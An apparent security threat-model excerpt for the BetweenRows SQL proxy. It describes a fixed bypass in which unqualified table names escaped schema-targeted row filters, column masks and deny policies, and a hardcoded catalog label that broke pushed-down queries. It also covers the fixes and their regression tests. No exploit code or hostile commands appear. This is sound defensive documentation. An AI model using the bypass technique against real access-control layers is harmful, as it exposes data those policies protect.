**Defense**: The policy layer reads the session's default schema from DataFusion's own `SessionContext` at query time — the same value `create_session_context_from_catalog` configured via `with_default_catalog_and_schema` at connect time — and uses it as the fallback whenever `scan.table_name.schema()` returns `None`. This is safe because BetweenRows installs exactly one default schema per session (`select_default_schema()` picks `"public"` if present, else alphabetical first), and `SET search_path` is explicitly blocked by `ReadOnlyHook`, so a bare reference is guaranteed to resolve against that one schema. A 3-line helper `scan_policy_key(scan, default_schema)` is used consistently by `collect_tables_inner`, `apply_row_filters`, `apply_column_mask_at_scan`, `apply_projection_qualified`, and `extract_metadata_inner` — so all five policy types see the resolved schema, not the empty-string default. `PolicyEffects` stores `default_schema` as a field populated in `collect` from `session_context.state().config_options().catalog.default_schema`, ensuring consistency across per-scan calls. The fix reads DataFusion's resolved state directly rather than maintaining a parallel guess, and is forward-compatible with future `SET search_path` support (at which point `default_schema: String` becomes `search_path: Vec<String>` and the fallback walks the list).

**Previously**: `collect_tables_inner` read `scan.table_name.schema().unwrap_or("")` and used the empty string verbatim as the df_schema key. `PolicyEffects::collect` then passed that vector to all five policy-type loops, where `TargetEntry::matches_table` compared `""` against `"public"` via glob matching and returned false. Existing integration tests never caught this because every authored policy used `schemas: ["*"]` (wildcard, which matches even the empty string), and existing unit tests used `LogicalPlanBuilder::scan("public.orders", ...)` with explicit schema qualifiers. A user on production who typed `SELECT * FROM orders` against a specifically-targeted policy silently bypassed the entire policy stack.

**Migration note**: This fix changed the shape of `ctx.query.tables` in decision function context from a flat-string array (`["public.orders"]`) to a structured array of `{datasource, schema, table}` objects. Any deployed decision function that read `ctx.query.tables` needs a mechanical update — e.g., `ctx.query.tables.includes("public.orders")` becomes `ctx.query.tables.some(t => t.schema === "public" && t.table === "orders")`. The flat form was unreliable anyway (bare references showed up as `"orders"`, not `"public.orders"`, so any exact-string matching was already buggy). The new object form makes that bug impossible to write by keying on discrete fields.

**Tests**:
  - `hooks::policy::tests::test_collect_user_tables_bare_reference_uses_default_schema` (unit) — asserts a bare scan resolves to `("public", "orders")` not `("", "orders")` when `default_schema = "public"`
  - `hooks::policy::tests::test_collect_user_tables_includes_user_table` (unit) — non-bare reference still works
  - `policy_enforcement::bare_reference_row_filter_still_applies` (integration) — attack 1
  - `policy_enforcement::bare_reference_column_mask_still_applies` (integration) — attack 2
  - `policy_enforcement::bare_reference_column_deny_still_applies` (integration) — attack 3
  - `policy_enforcement::bare_reference_column_allow_policy_required_still_applies` (integration) — attack 4
  - `policy_enforcement::bare_reference_table_deny_query_ctx_still_applies` (integration) — attack 5
  - `policy_enforcement::bare_reference_cte_wrapping_still_applies` (integration) — attack 6
  - `policy_enforcement::three_part_reference_with_datasource_catalog` (integration) — attack 7 (see vector 72)

---

### 72. Cross-database reference crash via hardcoded catalog label

**Vector**: Users connect to a BetweenRows datasource whose upstream Postgres database is named anything other than `postgres` — i.e., every real deployment. Any query that reaches DataFusion's SQL pushdown path emits a 3-part `TableReference` into the outgoing SQL — `SELECT ... FROM postgres.public.orders`. Upstream Postgres rejects this with `ERROR: cross-database references are not implemented: "postgres.public.orders"` because the first segment doesn't match the connected database. Every non-admin query fails. The user-visible symptom is total breakage on any production deployment.

**Attacks**:
  1. **Any query against a non-`postgres`-named upstream database** — `SELECT * FROM orders` against an upstream DB named `ecommerce_demo`; must not emit `postgres.public.orders` in the pushed-down SQL
  2. **Three-part reference using the datasource name as catalog** — new capability: `SELECT * FROM ds_threepart.threepart.orders` must resolve correctly and be policy-enforced identically to bare and 2-part variants

**Defense**: Two coordinated fixes:

1. `SqlTable::new_with_schema` uses `TableReference::partial(schema, name)` — a 2-part reference that unparses as `schema.table`, which upstream Postgres accepts regardless of the connected database name. The `SqlTable`'s stored reference is only used for SQL generation; DataFusion's catalog lookup happens separately at the `CatalogProvider` layer. Dropping the catalog segment is strictly safer because it decouples outgoing SQL from any catalog-label choice.

2. `create_session_context_from_catalog` takes a `datasource_name: &str` parameter and uses it for all three catalog-label sites (`with_default_catalog_and_schema`, `register_catalog`, `setup_pg_catalog`). The datasource name is the BetweenRows user-facing label (e.g. `"prod"`), not the upstream PG database name (e.g. `"ecommerce_demo"`). Users can write 3-part references like `SELECT * FROM prod.public.orders` that DataFusion resolves correctly, and policies apply the same enforcement to bare, 2-part, and 3-part forms. We deliberately do **not** use the upstream PG database name as the catalog label — that would leak infrastructure identifiers into user-visible SQL and break on upstream migrations.

**Previously**: Two independent issues compounded. First, `VirtualSchemaProvider::table` in `engine/mod.rs` built each `SqlTable` with `TableReference::full("postgres", schema, name)`, so the stored reference was a 3-part form that the SQL unparser emitted verbatim in pushed-down queries. Second, `create_session_context_from_catalog` hardcoded the DataFusion catalog label as `"postgres"` in three places — not as a semantic identifier, but as an arbitrary placeholder chosen during early development. This placeholder label became the origin of the `"postgres"` segment that `SqlTable` was relaying into outgoing SQL. Every deployment with an upstream database named anything other than `"postgres"` was effectively broken: queries failed with a cross-database reference error at upstream Postgres, and the only workaround was to write `postgres.public.orders` explicitly — which exposed a hardcoded internal placeholder as a required user-visible prefix.

**Rename fragility**: Because the datasource name is now user-facing (and the schema alias similarly), admin renames of either are breaking changes for SQL queries, decision functions that reference `ctx.session.datasource.name`, policy target configuration, and stored dashboards/queries. Policy *enforcement* on in-flight queries continues to work correctly across renames — `matches_table` resolves aliases to upstream schemas via `df_to_upstream` at session build time, so only user-typed identifiers are affected. A future rename-warning UX will surface the impact before admins commit renames. See the "Rename fragility and label-based identifiers" section in `docs/permission-system.md`.

**Tests**:
  - `policy_enforcement::three_part_reference_with_datasource_catalog` (integration) — attack 2 (creates a datasource named `ds_threepart`, connects, issues `SELECT ... FROM ds_threepart.threepart.orders`, asserts the query resolves and is policy-enforced identically to bare and 2-part variants)
  - Attack 1 is covered transitively by every existing integration test in `tests/policy_enforcement.rs` (~130 tests) — all use testcontainers-provisioned Postgres with auto-generated database names, none named `"postgres"`, so every test would have failed under the pre-fix `full("postgres", ...)` path

